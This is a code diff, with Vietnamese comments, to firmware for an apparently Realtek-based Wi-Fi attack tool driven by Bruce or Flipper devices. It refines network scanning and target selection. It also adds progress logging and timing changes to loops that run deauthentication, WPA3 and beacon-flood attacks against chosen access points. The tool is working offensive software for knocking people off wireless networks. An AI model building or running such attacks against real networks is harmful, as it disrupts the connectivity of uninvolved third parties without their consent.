@@ -141,7 +141,30 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
 
     bool exists = false;
     for (int i = 0; i < scanCount; i++) {
-      if (memcmp(scanResults[i].bssid, net.bssid, 6) == 0) { exists = true; break; }
+      // 1. Kiểm tra trùng địa chỉ MAC (BSSID): cập nhật tín hiệu mạnh hơn
+      if (memcmp(scanResults[i].bssid, net.bssid, 6) == 0) {
+        exists = true;
+        if (net.rssi > scanResults[i].rssi) {
+          scanResults[i].rssi = net.rssi;
+          scanResults[i].channel = net.channel;
+        }
+        break;
+      }
+
+      // 2. Lọc trùng tên AP (Mesh Wi-Fi / Repeater phát nhiều node cùng tên):
+      // Giữ lại node có tín hiệu RSSI mạnh nhất trên mỗi băng tần (2.4GHz hoặc 5GHz)
+      if (strcmp(net.ssid, "<hidden>") != 0 && strcmp(scanResults[i].ssid, net.ssid) == 0) {
+        bool is5g_new = (net.channel > 14);
+        bool is5g_old = (scanResults[i].channel > 14);
+        if (is5g_new == is5g_old) {
+          exists = true;
+          // Nếu node mới có sóng mạnh hơn, cập nhật sang node mạnh hơn
+          if (net.rssi > scanResults[i].rssi) {
+            scanResults[i] = net;
+          }
+          break;
+        }
+      }
     }
     if (!exists) {
       scanResults[scanCount] = net;
@@ -165,12 +188,34 @@ String getEncString(int sec) {
   return "UNK";
 }
 
+int getDelfySecurity(int sec) {
+  if (sec == RTW_SECURITY_OPEN) return 0; // OPEN
+  if (sec & RTW_SECURITY_WEP_PSK) return 1; // WEP
+#ifdef RTW_SECURITY_WPA3_SAE
+  if (sec & RTW_SECURITY_WPA3_SAE) return 5; // WPA3
+#endif
+#ifdef RTW_SECURITY_WPA3_AES_PSK
+  if (sec & RTW_SECURITY_WPA3_AES_PSK) return 5; // WPA3
+#endif
+  if (sec & RTW_SECURITY_WPA2_AES_PSK) return 3; // WPA2
+  if (sec & RTW_SECURITY_WPA_AES_PSK) return 2;  // WPA
+  return 3; // Mặc định WPA2
+}
+
+void flushUartBuffers() {
+  while (Serial.available()) Serial.read();
+  while (Serial1.available()) Serial1.read();
+  serialBuffer0 = "";
+  serialBuffer1 = "";
+}
+
 void stopAttack() {
   currentAttack = ATK_NONE;
   currentLedState = LED_OFF;
   setLedColor(0, 0, 0);
   cachedChannel = -1;
   isScanning = false;
+  wifi_set_channel(1);
 }
 
 void printScanResults();
@@ -216,6 +261,7 @@ void startScan() {
     
     isScanning = false;
     uartPrintln(""); 
+    flushUartBuffers(); // Xóa sạch lệnh thừa ("sc" hoặc "SCAN") tích tụ trong hàng đợi lúc quét
     uartPrintln("SCAN:OK");
     printScanResults();
     currentLedState = LED_GREEN_WAIT; 
@@ -251,15 +297,18 @@ void setup() {
 
 // --- ATTACK LOGIC ---
 void setTargetChannel(int ch) {
+  if (ch <= 0) return;
   if (cachedChannel != ch) {
     wifi_set_channel(ch);
     cachedChannel = ch;
-    delay(25); // Thời gian cho RF synthesizer / PLL và DMA ổn định tần số kênh mới
+    delay(20); // Thời gian cho RF synthesizer / PLL và DMA ổn định tần số kênh mới
   }
 }
 
 void atkDeauth() {
   static int currentTargetIdx = 0;
+  static unsigned long lastLogTime = 0;
+  static uint32_t packetCount = 0;
   
   if (selectedCount == 0) return;
   if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
@@ -279,11 +328,21 @@ void atkDeauth() {
     delay(5);
   }
   digitalWrite(PIN_LED_R, LOW);
-  delay(50); // Khoảng nghỉ 50ms cho DMA buffer giải phóng hoàn toàn, chống nghẽn hàng đợi
+  packetCount += 4;
+
+  // In log tiến trình định kỳ mỗi 2 giây để người dùng thấy rõ chip đang phát deauth liên tục, không bị treo
+  if (millis() - lastLogTime > 2000) {
+    lastLogTime = millis();
+    uartPrintln("[DEAUTH RUNNING] Pkts: " + String(packetCount) + " | CH: " + String(target.channel) + " | Target: " + String(target.ssid));
+  }
+
+  delay(40); // Khoảng nghỉ an toàn cho FreeRTOS nhường CPU và giải phóng hàng đợi DMA
 }
 
 void atkWpa3() {
   static int currentTargetIdx = 0;
+  static unsigned long lastLogTime = 0;
+  static uint32_t packetCount = 0;
   
   if (selectedCount == 0) return;
   if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
@@ -301,7 +360,14 @@ void atkWpa3() {
     delay(5);
   }
   digitalWrite(PIN_LED_R, LOW);
-  delay(50);
+  packetCount += 4;
+
+  if (millis() - lastLogTime > 2000) {
+    lastLogTime = millis();
+    uartPrintln("[WPA3 RUNNING] Pkts: " + String(packetCount) + " | CH: " + String(target.channel) + " | Target: " + String(target.ssid));
+  }
+
+  delay(40);
 }
 
 void atkBeaconRandom() {
@@ -357,7 +423,7 @@ void handleAttack() {
 void printScanResults() {
   uartPrintln("--- SCAN RESULTS ---");
   for (int i = 0; i < scanCount; i++) {
-    String line = "[" + String(i + 1) + "]\t" +
+    String line = "[" + String(i) + "]\t" +
                   String(scanResults[i].channel) + "\t" +
                   String(scanResults[i].rssi) + "\t" +
                   getEncString(scanResults[i].security) + "\t" +
@@ -376,7 +442,7 @@ void printRtlScanList() {
       line += String(scanResults[i].bssid[j], HEX);
     }
     line += "|" + String(scanResults[i].channel) + "|" +
-            String(scanResults[i].security) + "|" +
+            String(getDelfySecurity(scanResults[i].security)) + "|" +
             String(scanResults[i].rssi);
     uartPrintln(line);
   }
@@ -389,6 +455,14 @@ void processCommand(String cmd) {
   
   // 1. Lệnh quét mạng (Bruce "sc" hoặc Flipper "SCAN")
   if (cmd == "sc" || cmd.startsWith("SCAN")) {
+    static unsigned long lastScanTime = 0;
+    // Chống quét trùng lặp khi Bruce gửi đồng thời cả "SCAN" và "sc"
+    if (millis() - lastScanTime < 3000 && scanCount > 0) {
+      uartPrintln("SCAN:OK");
+      if (cmd == "sc") printScanResults();
+      return;
+    }
+    lastScanTime = millis();
     startScan();
   }
   // 2. Lệnh chọn mục tiêu Bruce ("sl:1,2,3" hoặc "sl:0")
@@ -401,8 +475,13 @@ void processCommand(String cmd) {
     while (token != NULL && selectedCount < MAX_TARGETS) {
       int id = atoi(token);
       int idx = -1;
-      if (id > 0 && id <= scanCount) idx = id - 1; // Bruce format: [1] -> index 0
-      else if (id == 0 && scanCount > 0) idx = 0;  // Delfy format: AP:0 -> index 0
+      // Chuẩn 0-based: 0 đến scanCount - 1 (Khớp hoàn toàn với AP:ID và [ID])
+      if (id >= 0 && id < scanCount) {
+        idx = id;
+      } else if (id == scanCount && scanCount > 0) {
+        // Dự phòng tương thích ngược 1-based (1 đến scanCount)
+        idx = scanCount - 1;
+      }
       
       if (idx >= 0 && idx < scanCount) {
         selectedTargets[selectedCount] = idx; 
@@ -432,8 +511,11 @@ void processCommand(String cmd) {
     } else {
       int id = targetStr.toInt();
       int idx = -1;
-      if (id > 0 && id <= scanCount) idx = id - 1;
-      else if (id == 0 && scanCount > 0) idx = 0;
+      if (id >= 0 && id < scanCount) {
+        idx = id;
+      } else if (id == scanCount && scanCount > 0) {
+        idx = scanCount - 1;
+      }
       if (idx >= 0 && idx < scanCount) {
         selectedTargets[0] = idx;
         selectedCount = 1;
@@ -441,9 +523,11 @@ void processCommand(String cmd) {
     }
 
     if (selectedCount > 0) {
-      currentAttack = ATK_DEAUTH;
-      cachedChannel = -1;
-      uartPrintln("[ATTACK STARTED: DEAUTH]");
+      if (currentAttack != ATK_DEAUTH) {
+        currentAttack = ATK_DEAUTH;
+        cachedChannel = -1;
+        uartPrintln("[ATTACK STARTED: DEAUTH]");
+      }
     }
   }
   // 4. Lệnh tấn công từ Bruce ("atk:...")
@@ -458,9 +542,11 @@ void processCommand(String cmd) {
         }
       }
       if (selectedCount > 0) {
-        currentAttack = ATK_DEAUTH; 
-        cachedChannel = -1;
-        uartPrintln("[ATTACK STARTED: DEAUTH]");
+        if (currentAttack != ATK_DEAUTH) {
+          currentAttack = ATK_DEAUTH; 
+          cachedChannel = -1;
+          uartPrintln("[ATTACK STARTED: DEAUTH]");
+        }
       } else {
         uartPrintln("[ERROR: No target selected. Use sl:id]");
       }
@@ -472,9 +558,11 @@ void processCommand(String cmd) {
         }
       }
       if (selectedCount > 0) {
-        currentAttack = ATK_WPA3;
-        cachedChannel = -1;
-        uartPrintln("[ATTACK STARTED: WPA3]");
+        if (currentAttack != ATK_WPA3) {
+          currentAttack = ATK_WPA3;
+          cachedChannel = -1;
+          uartPrintln("[ATTACK STARTED: WPA3]");
+        }
       }
     }
     else if (type == "beacon" || type == "random") {
